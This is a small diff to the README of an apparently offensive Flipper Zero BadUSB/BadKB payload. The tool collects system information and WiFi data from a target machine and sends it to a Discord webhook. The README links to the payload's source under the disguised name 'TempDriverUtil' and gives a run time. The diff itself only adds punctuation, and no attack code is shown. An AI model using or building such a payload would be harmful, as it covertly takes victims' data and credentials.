@@ -10,7 +10,7 @@ Under **CUSTOMIZATION** place your discord webhook url into the line that says "
 
 Move to FlipperZero and run :D
 
-(You may also customize what the program does by setting the variables after $webhook to "true" or "false", capitalization doesn't matter)
+(You may also customize what the program does by setting the variables after $webhook to "true" or "false", capitalization doesn't matter).
 
 Default = true,true,true
 
@@ -19,7 +19,7 @@ Default = true,true,true
 [Full .exe code also included.](https://github.com/PCMon/FlipperZero-BadUSB-BadKB-SysInfoAndWifi/blob/main/TempDriverUtil.py)
 
 If the program fails in some way to collect any information as seen in the webhook embeds please comment the issue and i'll look into it.
-(GPU data currently only works for NVIDIA gpus)
+(GPU data currently only works for NVIDIA gpus).
 
 PAYLOAD TIME: 15.812s
 
